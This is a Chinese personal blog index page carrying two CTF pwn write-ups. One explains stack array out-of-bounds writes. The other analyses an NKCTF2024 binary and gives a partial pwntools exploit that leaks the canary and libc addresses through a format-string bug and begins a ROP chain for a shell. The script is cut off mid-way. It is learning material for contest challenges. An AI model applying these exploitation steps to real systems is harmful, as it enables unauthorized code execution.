<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Wgiegie-纲的blog</title>

  <!-- keywords -->
  
    <meta name="keywords" content="Wgiegie">
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="纲的blog">
<meta property="og:url" content="https://2023478.github.io/index.html">
<meta property="og:site_name" content="纲的blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="wgiegie">
<meta property="article:tag" content="Wgiegie">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="纲的blog" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.1.1"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwn%E9%A2%98%E8%A7%A3/" style="font-size: 10px;">pwn题解</a> <a href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">搭博客</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-数组越界" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/" class="article-date">
  	<time datetime="2024-03-30T02:53:25.000Z" itemprop="datePublished">2024-03-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/">
        数组越界
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>昨天在攻防世界刷题的时候，无意之间找到一道题，不算难，就是一道很基础的栈溢出的题目，不过这个栈溢出的方式在我之前做的题里边还没怎么遇见，今天把他全部整出来了，故写这篇博客记录一下这方法和这道题的wp</p>
<p>放一下题目的连接<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界 (xctf.org.cn)</a>，是这里面pwn的stack2题目</p>
<p><img src="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/image-20240330110056677.png" alt="image-20240330110056677"></p>
<p><strong>知识点</strong></p>
<p>在这道题中用到的栈溢出的方法便是这篇博客的题目，<em>数组越界</em>，</p>
<p>我们知道在C语言之中有一种叫数组的东西，就像<code>int a[9]=0</code>,这样的（字母[数字]）便叫数组，数组一般在定义的时候变会在栈上规划好一片空间，用于专门放数组内的数，一般来说，我们如果在调用数组的时候要对数组中的数进行我们需要的定义时，会可能使用如下的定义方式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span></span><br><span class="line"><span class="type">int</span> b=<span class="number">0</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>]=<span class="number">0</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,$i)</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,$b)</span><br><span class="line">    a[i]=b</span><br></pre></td></tr></table></figure>

<p>即对于数组的第几位和大小都由自己进行定义，这样的定义虽然很方便，但有一个巨大的问题在于在我们一开始的时候便对数组已经下好了定义，而程序在下定义时便已经将栈上的空间分配好了，而我们定义的数组也是只有固定的大小，就像在上面的代码中我们定义的数组是<code>int a[10]=0</code>，那么便只有a[0]到a[9]的长度是在栈上用于存放这个数组的长度的，其他的栈空间，都有属于他们自己的命令与作用，</p>
<p>但是，如果在程序中使用了如上的自定义数组的方式，由于C语言对我们有很大的信任，这样的定于在编译时是不会报错的，但如果我们在定义第几个数组i的这里超过了本来定义好的数组的长度，程序中没有对这个进行长度检查的方式，于是程序会直接就按你发送的长度在栈上找到相应的地方将你之后输入的内容存放进去。</p>
<p>于此，数组越界的利用方式便出来了，当我们可以对数组的第几个数进行自定义时，程序并不会检查是否超过数组的长度，而是依然在栈上寻找输入的相应的地址将要存放的内容存放进去，但是我们知道在数组定义之初，栈上的空间便是以经分配好的了，出了数组相应的空间，栈上的其他空间都存放有相应的数据与命令，而数组越界让我们有了将栈上其他空间的数据改变的能力。</p>
<p>当数组越界发生时，只要我们知道发生越界的这个数组开头与我们需要改变的栈上的数据的地址的距离，便可以在一开始输入数组个数时将距离输入，程序变回自动将这个距离指向的地址找到，然后我们在输入要存放数据，程序变会将会那个地址里存放的内容改为我们输入的数据，但是栈上存放的很大一部分是我们在后面需要执行的数据，特别像<code>ret</code>等命令执行完成之后，esp寄存器所指向的便是程序要执行的命令所存放的地址如下，程序在执行ret命令之前变回将下一步的命令的地址放在esp寄存器中</p>
<p><img src="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/image-20240330142352990.png" alt="image-20240330142352990"></p>
<p>因此，只要我们在知道程序中数组的开头地址，与在执行完这一段包含数组的命令的最后ret命令时，esp寄存器的值，算出差值，在程序执行的过程中将差值输入其中并将其内容改为需要执行的数值，便完成对程序执行的控制，达成栈溢出的目的。<br>以上便是关于栈溢出中数组越界的基本知识点与利用，如果你看了还是不太明白，你可以选择在网上看看其他大佬写的，以上只是我个人的理解与想法，或许有不对的欢迎指出。</p>
<p>接下来便以一道题来做解。</p>
<p><strong>stack2的wp</strong></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hxctf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/28/hxctf/" class="article-date">
  	<time datetime="2024-03-28T07:08:34.000Z" itemprop="datePublished">2024-03-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/28/hxctf/">
        NKctf2024 第一题
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>  这是一道之前在有个周末的比赛中的题，比赛是NKCTF2024，网站已经没有了，算是一个战队的招新比赛吧，不过算是一道比较简单的题，主要的漏洞就是格式化字符串漏洞和一个栈溢出，相较于之前那些动不动就上堆的题目好了不止一点，虽然在最后的时候还会有一个特别坑的地方，不够这就已经是后话了，等到的时候再慢慢说。</p>
<p>老规矩，先checksec一下程序，保护全开，有点难整，不过还是丢到ida里面去看看怎么样，</p>
<p><img src="/2024/03/28/hxctf/image-20240328153030882.png" alt="image-20240328153030882"></p>
<p>这是在ida里面的主函数的样子</p>
<p><img src="/2024/03/28/hxctf/image-20240328153438575.png" alt="image-20240328153438575"></p>
<p>有canary保护，主要程序一上来就是一个无限循环的函数，便开始跟随程序的过程一步一步来，先看sub_1289()这第一个函数，感觉像解决缓冲区的函数，</p>
<p><img src="/2024/03/28/hxctf/image-20240328153959045.png" alt="image-20240328153959045"></p>
<p>果然是一个用于解决缓冲区的函数，不过问题是在代码的最后几行使用了，seccomp函数，这个函数一般是用来开起沙箱保护，关于具体使用沙箱禁止了哪些函数可以用工具直接查看，关于工具的使用如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./文件名</span><br></pre></td></tr></table></figure>

<p>关于这个工具，如果一个程序开启了沙箱，这会出现类似如下的情况，如果没开则会直接进入程序的执行过程</p>
<p>这道题的沙箱结果如下，</p>
<p>当时我第一次分析的时候，不理解这个沙箱的含义，误以为这个题是只能进行open函数的系统调用，导致做了一个下午的无用过，这里便将这个工具的大概讲一讲避免下次还出现这样的傻13问题</p>
<img src="/2024/03/28/hxctf/image-20240328155823265.png" alt="image-20240328155823265" style="zoom: 25%;">

<img src="/2024/03/28/hxctf/image-20240328154528444.png" alt="image-20240328154528444" style="zoom: 200%;">



<p>关于这个工具的具体是嘛，我已不太懂，不过现在大概明白该怎么看这个工具的使用，像这道题中就有A&#x3D;&#x3D;open就跳转0007，而0007的内容便是kill像这种便是将open函数紧用，而其他的函数都是可以用的。如果还有其他函数后面跟的数字在前面的表中的最后是kill这这个函数便是禁用的，其他的函数便是可以用的，像这题便是可以通过system等系统调用从而进行拿到远程服务器的shell，但同时禁用的open便不再能使用orw的办法将远程的flag直接读到屏幕上。</p>
<p>现在便在次回到一开始的main函数中，开始执行，会要我们输入点东西，只是这个有限制，只能输入1和2并且输入2还没有什么用，暂时会回到程序一开始输入的地方，我们便只能输入1，进入到sub_188c()这个函数中，</p>
<p><img src="/2024/03/28/hxctf/image-20240328162015627.png" alt="image-20240328162015627"></p>
<p>很明显这个函数中没有什么可以用的地方，但是当我们回到main函数中，找到sub_19EA()函数并进入其中，会发现直接出现了一个格式化漏洞，如下，</p>
<p><img src="/2024/03/28/hxctf/image-20240328162412607.png" alt="image-20240328162412607"></p>
<p>很明显关这一个格式化漏洞变可以将canary和pie保护都给绕过，还可以将程序的libc_base地址暴露出来，配合同题目一起下载的libc版本，大部分栈的问题基本就解决了，虽然在这里能read的数据才只有8字节，能暴露的数据好像挺少的，但别忘了在main函数中这是一个巨大的无限循环函数，只要在执行完这个函数后再回到之前的地方，然后在执行会来便可以有多暴露几个地址。同时查看这个函数中的sub_1984()函数会发现，又有新的漏洞。</p>
<p>在这里我们想要进入sub_1984()函数之前还会有一个判断，当dword_504c &lt; dword_5010会直接进入exit中从而结束进程，因此我们要保证dword_504c &gt; dword_5010从而顺利进入sub_1984()函数，而这两个数dword_5010的大小为11682，而dword_504c则和之前的一个函数中的过程有关系，到之后在讲，反正要保证在执行这个函数之前dword_504c的值一定要大于11682。</p>
<p><img src="/2024/03/28/hxctf/image-20240328162449070.png" alt="image-20240328162449070"></p>
<p>在这里有一个致命的漏洞，便是栈溢出，可以读0x80的数据但buf只能放0x30的数据，在结合之前的格式化字符串漏洞，将canary绕过，然后执行system（&#x2F;bin&#x2F;sh）便可以直接拿到shell。</p>
<p>那现在便要回到main函数中，看怎么才能到sub_19EA()中，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1289();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_134F();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_188C();</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> &amp;&amp; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_19EA();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> || v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid option.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Calculate your rating first.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在这里可以很明显看出来，要进入到其中必须保证输入的v3&#x3D;&#x3D;2&amp;&amp;v4，而如果一开始就输入2那v4的值为0，将不会成立，因此要先执行v3&#x3D;&#x3D;1是的所有函数并成功退出来，使v4&#x3D;&#x3D;1，然后将v3输入2，才能进入其中，</p>
<p>于我们便进入sub_188C()函数中去寻找如何能过顺利通过这个函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_188C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> v0; <span class="comment">// xmm0_8</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">double</span> v5; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [rsp+23h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input chart level and rank.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lf %s&quot;</span>, &amp;v5, v7);</span><br><span class="line">    v0 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">15.0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v3++;</span><br><span class="line">      <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_1633(v7);</span><br><span class="line">    v6 = v0 * v5 + v6;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_504C = (<span class="type">int</span>)v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Calculation Done.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在第一次看这里的时候会发现是个有50次循环的函数，每一次都需要输入一个双精度浮点数（小数，121.22）和字符，然后好像只要输入的双精度浮点数是15.0，便可以满足第一个判断条件，使v1&#x3D;&#x3D;v3++，由于输入时的v3为1那此时v1变等于2，满足条件，进入函数中，然后返回去。</p>
<p>这个如果是像上面想的一样就好了，但在运行时会发现并不是这样的，他依然会再次循环，重新输入两个数，因此不在想通过满足条件的方法返回，干脆直接写一个函数运行50次。进行50次的输入，从而完成循环，返回main函数。</p>
<p>在这里有一个函数是关于我们输入的字符v7的，如下</p>
<p><img src="/2024/03/28/hxctf/image-20240328185516369.png" alt="image-20240328185516369"></p>
<p>这段代码看起来是一个简单的映射函数，根据输入的不同字符串返回不同的64位整数值。我们在运行时喂了满足要求，便可以将之前那个循环中的要输入的字符串，定为这里面的随机一个（C，D，A，B任选一个便可以）。</p>
<p>再往下面看会有两行有趣的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v6 = v0 * v5 + v6;</span><br><span class="line">dword_504C = (<span class="type">int</span>)v6;</span><br></pre></td></tr></table></figure>

<p>在前面的代码可以知道，v5是我们输入的数，v0&#x3D;&#x3D;v5，在执行这里前v6&#x3D;0，因此dword_504C值等于我们再循环中输入的最后一次的数的平方，然后在后面我们为了要进入那个漏洞函数必须要保证dword_504c的值一定要大于11682，因此我们写入得数可以考虑大一点，方便后面直接进入栈溢出函数，</p>
<p>于此便可以写出能进入sub_19EA()函数的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;111.0 SSS+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>自此便能顺利进入sub_19EA()函数中，进行地址的泄露，和栈溢出，这里边不在多讲，比较简单，只要注意的在与，当到栈溢出时候，只要不溢出，便又会回到main函数，并且这里由于之前已经将1中的过程过了便可以不在过1，直接进行2进入到格式化漏洞出。</p>
<p>具体的看exp便可以，然后在exp中由于在一开始写的时候将沙箱的内容看错，因此有的写的多了，在真正用的并不是全部的，有的可以删去，并没有删（太懒了不想动了），并且有的地方可以写成函数已没有，因此重复的地方有点多（python有点差了·，找时间补一下）具体的自己看吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node.nkctf.yuzhian.com.cn&quot;, 38793 )</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span> ,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b $rebase(0x19e8)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#在这题中由于开启了PIE保护，故要下断点必须加上$rebase()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;111.0 SSS+&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#以上是进入漏洞函数</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary =<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary: &#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#将canary的值暴露出来，方便栈溢出</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;maimai?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#为了回到main函数中，随便读入数据进去</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;nickname.\n&#x27;</span>,<span class="string">b&#x27;%33$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main_128=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main_128: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main_128))</span><br><span class="line">libc_start_main=libc_start_main_128-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_start_main: &#x27;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#将libc_base的值暴露出来，先随便暴露一个函数的got表地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elo=ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">elo=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc_start_main_libc=elo.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__libc_start_main_libc&#x27;</span>,<span class="built_in">hex</span>(libc_start_main_libc))</span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open_libc&#x27;</span>,<span class="built_in">hex</span>(open_libc))</span><br><span class="line">setuid_libc=elo.symbols[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过链接libc库从而找到暴露的函数的偏移量，以及需要的函数的偏移量</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret_libc=<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi_ret_libc=<span class="number">0x2be51</span></span><br><span class="line">pop_rbp_ret_libc=<span class="number">0x2a2e0</span></span><br><span 